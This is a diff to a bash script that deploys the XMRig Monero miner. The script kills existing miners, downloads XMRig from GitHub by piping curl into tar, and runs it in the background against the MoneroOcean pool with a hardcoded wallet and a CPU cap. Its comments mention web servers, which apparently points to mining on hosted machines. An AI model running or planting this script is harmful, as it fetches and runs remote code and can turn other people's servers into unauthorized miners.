@@ -2,41 +2,17 @@
 WALLET=458dxk6pcKg3KR6YGVByY1FKKr88GPnz3XxQL7c7zx5UNoxAsKzMN4JJ8zbffq4LRv8dk5CXYBVAEdYBe2avS9qt7jjjKpa
 DIR=$HOME/moneroocean
 
-# 1. Kill everything
+# 1. Clean and Prepare
 killall -9 xmrig 2>/dev/null
-rm -rf $DIR
-mkdir -p $DIR
+rm -rf $DIR && mkdir -p $DIR && cd $DIR
 
-# 2. Download OFFICIAL XMRig (No benchmarks, just mining)
-# This version is much more stable for web servers
-curl -L "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz" -o /tmp/xmrig.tar.gz
-tar xf /tmp/xmrig.tar.gz -C $DIR --strip-components=1
-rm /tmp/xmrig.tar.gz
+# 2. Grab the latest portable miner
+curl -L "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz" | tar xz --strip-components=1
 
-# 3. Create the Simple Config
-cat >$DIR/config.json <<EOL
-{
-    "autosave": false,
-    "donate-level": 1,
-    "cpu": {
-        "enabled": true,
-        "max-threads-hint": 35
-    },
-    "pools": [
-        {
-            "url": "gulf.moneroocean.stream:10128",
-            "user": "$WALLET",
-            "pass": "web-worker",
-            "keepalive": true,
-            "tls": false
-        }
-    ],
-    "log-file": "$DIR/xmrig.log"
-}
-EOL
+# 3. Launch with parameters (No config file)
+# --cpu-max-threads-hint=50: Capped at 50% CPU
+# --randomx-mode=light: Minimal RAM usage (prevents "Killed" error)
+# -o: Pool / -u: Wallet / -p: WorkerName / -B: Run in Background
+./xmrig -o gulf.moneroocean.stream:10128 -u $WALLET -p direct-bash --cpu-max-threads-hint=50 --randomx-mode=light -B
 
-# 4. Launch
-cd $DIR
-nohup ./xmrig -c config.json > /dev/null 2>&1 &
-
-echo "SUCCESS: Stock Miner started. Calibration skipped entirely."
+echo "Miner launched on $(nproc) threads at 50% capacity."
